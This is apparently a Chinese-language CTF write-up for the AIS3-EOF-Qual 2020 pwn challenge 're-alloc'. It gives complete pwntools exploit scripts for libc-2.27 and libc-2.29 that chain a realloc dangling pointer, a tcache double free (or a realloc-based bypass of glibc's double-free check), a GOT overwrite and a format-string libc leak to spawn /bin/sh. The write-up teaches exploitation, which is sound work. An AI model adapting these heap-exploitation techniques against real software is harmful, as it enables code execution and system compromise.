AIS3-EOF-Qual 2020 - [Pwn] re-alloc
===
- [Description](#Description)
- [Vulns](#Vulns)
- [Idea](#Idea)
- [Exploit on libc-2.27](#Exploit-on-libc-227)
- [Exploit on libc-2.29](#Exploit-on-libc-229)

# Description
![](https://i.imgur.com/hZSwV1O.png)

![](https://i.imgur.com/cW46zFY.png)

題目給了 `libc-2.29.so`, 以此判斷可運行在 ubuntu 19.04

![](https://i.imgur.com/w8sDSjF.png)

這題一開始我是先在比較熟悉的 `libc-2.27.so` 上找出 solution

才接著又寫了一個打 `libc-2.29.so` 的版本

而以下會先解釋 `libc-2.27.so` 版

再講比賽時適用的 `libc-2.29.so` 版(比較有隨著版本變遷的港覺 ouo)

# Vulns
realloc 還蠻神奇的, 看看 realloc 的 source code (可參考[我的筆記](https://hackmd.io/BoPKMhLwQM25-ClipHCdpw?view))

`realloc(oldmem, bytes)` 有幾個 case

- `oldmem == NULL` 
    - 形同 call `malloc(bytes)`
- `oldmem != NULL && bytes == 0` 
    - 形同 call `free(oldmem)`
- `oldmem != NULL && bytes != 0`
    - 這才不會只是其他已經有的咚咚的形狀

題目中的三個主要 function 主要功能如下

- Alloc
    - 實際上使用 `ptr = realloc(NULL,size);`
- Realloc
    - 實際上使用 `ptr = realloc(heap[idx],size);`
- Free
    - 實際上使用 `realloc(heap[idx],0);`

(當然這只是簡化，下文將假設你已詳細看完 code)

若先用 Alloc 創造一塊 size 是 0x20 的 chunk

再用 Realloc 中, 輸入此 chunk idx **並且 size 輸入 0**

**會變成 free 掉這塊 chunk, 卻沒將此 ptr 清除, 造成 dangling pointer**

**再用 Free, 輸入此 chunk idx, 達到 double free**

# Idea
思路是製造出 T-cache double free

因為 PIE disabled 而且 RELRO partial, 所以往爆改 got table 想

看到 atoll 的參數 buf 是可輸入的, 如果能把 atoll 改成 system 就能直接開 shell

但因為 ASLR, 不知道 libc 位址, 也就不知道 system 位址

所以要先想辦法 leak libc

而要 leak libc，可以透過把 atoll 改成 printf@plt (PIE disabled 所以 printf@plt 已知)

就有 Format string vulns, 就能 leak 躺在 registers/stack 裡的值, 這些地方有機會有 libc address

表示這樣有機會 leak libc

leak 後要再想辦法再度把 atoll 改成 system, 就能簡簡單單輸入 `/bin/sh` 開 shell

# Exploit on libc-2.27
首先是一些 function 定義, 方便後續 exploit 好寫
```python
from pwn import *
context.arch = 'amd64'

printf_plt = 0x401070

atoll_got = 0x404048

def allocate(idx, size, data=None):
    p.sendlineafter('choice: ', str(1))
    p.sendlineafter('Index:', str(idx))
    p.sendlineafter('Size:', str(size))
    if data != None:
        p.sendafter('Data:', data)

def reallocate(idx, size, data=None):
    p.sendlineafter('choice: ', str(2))
    p.sendlineafter('Index:', str(idx))
    p.sendlineafter('Size:', str(size))
    if data != None:
        p.sendafter('Data:', data)

def rfree(idx, isBytes=False):
    p.sendlineafter('choice: ', str(3))
    if isBytes == False:
        p.sendlineafter('Index:', str(idx))
    else:
        p.sendlineafter('Index:', idx)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
p = process('./re-alloc')
```

再來是把 atoll@got 改成 printf@plt 的部分
```python
# Double free attack
writehere = atoll_got
allocate(1, 0x10, b'a'*0x10) # heap[1] = malloc(0x10)
reallocate(1, 0) # free(heap[1])
rfree(1) # free(heap[1]), heap[1] = 0
```
以上部分稍作解釋：
- 首先 `allocate(1, 0x10, b'a'*0x10)`, 重點是執行了
    - `heap[1] = realloc(NULL, 0x10)`
        因為 `oldmem == NULL` 所以實際上是等同呼叫 `malloc(0x10)`，返回 size 0x20 chunk
- `reallocate(1, 0)`，重點是執行了
    - `ptr = realloc(heap[1], 0);`
        因為 `oldmem != NULL && bytes == 0` 所以實際上等同呼叫 `free(heap[1])` 造成 dangling pointer
- `rfree(1)`，重點是執行了
    - `realloc(heap[1], 0);`
        跟上面理由一樣, 等同呼叫 `free(heap[1])` 造成 Tcache double free
    - `heap[1] = NULL `
        此時 heap[1] 才終於被清除, 但 double free 已成形

```python
allocate(0, 0x10, p64(writehere).ljust(0x10, b'\x87')) # heap[0] = malloc(0x10)
rfree(1) # malloc(0), garbage
payload = p64(printf_plt)
allocate(1, 0x10, payload[:0x7]) # heap[1] = malloc(0x10), arbitrary write
```
- 申請走第一個 0x20 Tcache bin
    - 此時這塊 chunk 處於 Used 和 Free 之間
    - 隨後往之寫入 atoll@got 的位址, 覆蓋掉 fd, 控制 0x20 Tcache chain
        - 原本的 chain 長這樣
            - 躺在heap的正常 chunk -> 躺在heap的正常 chunk **(double free)**
        - 後來變成
            - 躺在heap的正常 chunk -> **atoll@got** -> \?\?\?\?\?
- `rfree(1)` 重點是執行了 `realloc(heap[1], 0)`
    - 但 `heap[1]` 已清空, 所以符合 `oldmem == NULL`
        - 所以實際上是執行 `malloc(0)`, 申請 size 0x20 的 chunk
        - 原本的 chain 長成這樣
            - 躺在heap的正常 chunk -> **atoll@got** -> \?\?\?\?\?
        - 後來變成
            - **atoll@got** -> \?\?\?\?\?
- 下次再 allocate 一塊 0x20 的 chunk 就會拿到以 **atoll@got** 最為資料頭的 chunk
- 如此就能改寫 **atoll@got** 囉

再來是 leak libc 的部分
```python
# Leak libc
rfree('%7$p')
libc.address = int(p.recvuntil('\n', drop=True), 16) - libc.symbols['_IO_2_1_stdout_']
print('libc: {:#x}'.format(libc.address))
```
注意現在 `atoll` 已經變成 `printf`, 所以多一個 Format string vuln 可以打ㄌ

leak 出來 libc 後, 再來就是再度改寫 `atoll` 的部分
```python
# Double free attack again with Format string attack
reallocate('\0', '%95x', '\0') # heap[0] = realloc(heap[0], 0x60)
reallocate('\0', '\0') # free(heap[0])
rfree('\0') # free(heap[0]), heap[0] = 0
allocate('\0', '%95x', p64(writehere) + b'\0') # heap[0] = malloc(0x60)
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
allocate('\0', '%95x', p64(writehere) + b'\0') # heap[0] = malloc(0x60), garbage
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
payload = p64(libc.symbols['system'])
allocate('\0', '%95x', payload[:0x7]) # heap[0] = malloc(0x60), arbitrary write
```
注意 `printf` 的 return 值是輸出了多少字
所以可以透過 `printf('\0')` 來讓 return 值是 0
- 原先未改寫 atoll@got 的時候要 free heap[0] 時...
    - `rfree(0)`
        - 因為 `atoll("0\n")` return 0, idx = 0
- 將之改寫成 `printf` 後, 一樣想 free heap[0] 時...
    - `rfree('\0')`
        - 因為 `printf("\0\n")` return 0, idx = 0
- 想 `malloc(0x60)` 時
    - `atoll("96\n")` return 0x60
    - `printf("%95x\n")` 也是 return 0x60 (換行也算輸出一個字元)

只是這階段的限制是不能再 free 到 heap[1], 因為那邊 chunk 沒有偽造好, free 下去會爆掉

但沒關係, 有 format string vuln, 可以讓我用了 heap[0] 後再把 heap[0] 清空, 就能一直 allocate

此階段結束後, atoll@got 就成功改寫成在 libc 中的 system 了

```python
rfree(b'/bin/sh\0', isBytes=True) # system('/bin/sh')

p.interactive()
```
爽拿 shell

# Exploit on libc-2.29
而以上 exploit 無法打 libc-2.29 的原因是

libc-2.29 對於 Tcache 的 double free attack 加了防禦：
```c
static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  ...
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
  ...
}
```

可以看到
- `if (tcache != NULL && tc_idx < mp_.tcache_bins)`
    - `tcache` 在這邊已經有初始化過了, 且因為 size 被限制在 0x78 底下, 正常來說一定滿足 `tc_idx < mp_.tcache_bins`

- `if (__glibc_unlikely (e->key == tcache))`
    - `e->key` 其實就跟熟悉的 chunk->bk 代表同一個地方
    - 在正常 free 掉之後, `e->key` 會被設定為 `tcache`
    - 也就是說，正常寫 code 情況下, 這個 if 通常不會成立, 因為你不會沒事 double free, `e->key` 在還沒 free 的情況下是正常使用者存放的資料, 不太會等於 `tcache`, 這個多加的防禦對於正常使用情況下只會多跑一兩個 if 判斷, 效能影響不大
    - **阿不過這就是問題所在, 就是因為這個, 直接打 double free 時會讓此 if 成立**
        - 裡面直接遍尋整個 linked list, 有重複就 `malloc_printerr`

但目前也想不到其他方法, 只能試圖硬繞看看這個保護

**進到遍尋整個 linked list 的 code block 的話, double free 一定會被揪出來**

所以不要進到辣個 code block, 只能想辦法讓前面兩個 if 其中一個不要走進去

而第一個 if 直覺想是繞不掉

第二個 if 要改掉`e->key`(跟 bk 同樣位址) 好像值得一踹

但突然就被我 Try 到 realloc 的一個特性, 讓我完全不用用到 double free
```c
void *
__libc_realloc (void *oldmem, size_t bytes)
{
  ...
  if (SINGLE_THREAD_P)
    {
      newp = _int_realloc (ar_ptr, oldp, oldsize, nb);
      assert (!newp || chunk_is_mmapped (mem2chunk (newp)) ||
	      ar_ptr == arena_for_chunk (mem2chunk (newp)));

      return newp;
    }
  ...
}
```
進到 `_int_realloc` 後, 若 `oldsize >= nb` 則仍舊分配 `oldp` 給 `newp`, 意思是反正舊有的 chunk size 夠大, 要做的只是調整 size, 如果 remainder 還有足夠大的空間就要多做處理一下

來看 exploit 腳本的部分

前面 function 部分跟上一 part 的相同

```python
# Double-free-like attack
writehere = atoll_got
allocate(1, 0x10, b'a'*0x2) # heap[1] = malloc(0x10)
reallocate(1, 0) # free(heap[1])
allocate(0, 0x10, b'a'*0x2) # heap[0] = malloc(0x10)
rfree(1) # free(heap[1]), heap[1] = 0
reallocate(0, 0x10, p64(writehere).ljust(0x10, b'\x87')) # heap[0] = realloc(heap[0], 0x10)
rfree(1) # malloc(0), garbage
payload = p64(printf_plt)
allocate(1, 0x10, payload[:0x7]) # heap[1] = malloc(0x10), arbitrary write
```
解釋一下：
- `heap[1] = malloc(0x10)`
    - 寫入啥不重要
- `free(heap[1])`
- `heap[0] = malloc(0x10)`
    - 寫入啥不重要
    - 製造出 `heap[0]` `heap[1]` 都指向同一塊記憶體
- `free(heap[1])`
    - 先 free 是為了等等要再來這邊拿 chunk
    - 現在 Tcache chain:
        - 躺在heap的正常 chunk -> 0 (end)
- **`heap[0] = realloc(heap[0], 0x10)`**
    - 因為 `heap[0]` 未清空, 指著一塊 size 正確的 chunk
    - **這邊就就用到剛剛說的 realloc 的特性**, `oldsize >= nb`
    - **舊 size 夠大, newp 依舊是 oldp, return `heap[0]` 就好**
    - 如此就能寫入ㄌ, 寫進 `atoll@got`
    - 現在 Tcache chain:
        - 躺在heap的正常 chunk -> **atoll@got** -> \?\?\?\?\?
- `malloc(0)`
    - 現在 Tcache chain:
        - **atoll@got** -> \?\?\?\?\?

如此一來再拿一塊就能把 `atoll@got` 改寫成 `printf@plt` 嚕

一樣的 leak libc
```python
# Leak libc
rfree('%7$p')
libc.address = int(p.recvuntil('\n', drop=True), 16) - libc.symbols['_IO_2_1_stdout_']
print('libc: {:#x}'.format(libc.address))
```

最後一部分
```python
# Double free attack again with Format string attack
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
rfree(b'%9$nxxxx' + p64(0x4040d8), isBytes=True) # Clear heap[1] by fmt str attack
allocate('a\0', '%95x', b'a'*0x2) # heap[1] = malloc(0x60)
reallocate('a\0', '\0') # free(heap[1])
allocate('\0', '%95x', b'a'*0x2) # heap[0] = malloc(0x60)
rfree('a\0') # free(heap[1]), heap[1] = 0
reallocate('\0', '%95x', p64(writehere).ljust(0x10, b'\x87')) # heap[0] = realloc(heap[0], 0x60)
rfree(b'%9$nxxxx' + p64(0x4040d0), isBytes=True) # Clear heap[0] by fmt str attack
allocate('\0', '%95x', b'a'*0xf) # heap[0] = malloc(0x60), garbage
payload = p64(libc.symbols['system'])
allocate('a\0', '%95x', payload[:0x7]) # heap[1] = malloc(0x60), arbitrary write
```
利用跟前面一樣的道理, 把 `atoll@got` 改為 `system`

```python
rfree(b'/bin/sh\0', isBytes=True) # system('/bin/sh')

p.interactive()
```

**這種打法就能通吃 libc-2.27 libc-2.29 了**

###### tags: `CTF`